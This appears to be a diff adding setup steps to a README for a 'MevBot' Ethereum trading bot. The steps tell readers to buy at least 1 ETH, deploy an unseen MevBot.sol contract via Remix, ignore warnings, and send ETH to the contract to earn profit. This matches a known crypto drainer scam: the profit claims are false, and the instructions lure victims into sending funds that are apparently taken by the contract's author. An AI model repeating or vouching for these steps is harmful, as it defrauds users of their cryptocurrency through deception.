@@ -30,3 +30,28 @@ Expected returns
 Make money with MevBot (ETH network)
 
 How it works:
+
+
+The bot will make transactions on your entire balance to increase profit
+
+VERY FIRST STEP: Install Metamask and buy enough Etheruem, at least 1 ETH;  https://metamask.io/
+
+Copy code and paste the code of MevBot.sol file in Remix IDE;     https://remix.ethereum.org/#lang=en&optimize=false&runs=200&evmVersion=null
+
+Click Solidity complier 0.8.0 And press Compile FlashBot.sol, DON'T WORRY ABOUT WARNINGS ABOUT THE LISCENCE, IT WILL STILL WORK, JUST IGNORE THIS
+
+Then click DEPLOY 
+
+Next, step, copy the new contract address and send at least 1 ETH to this via Metasmask, using the SEND FUNCTION.
+
+Now let the bot work its magic and just leave it to run for as long as possible.
+
+The more ETH you fund the contract with the more profit.
+
+LAST STEP, just hit withdraw to get your profit. 
+
+SO WHY FUND THE CONTRACT WITH ETHEREUM? 
+
+Simple, you need to cover the gas fees. These will paid back by the profit you make. 
+
+
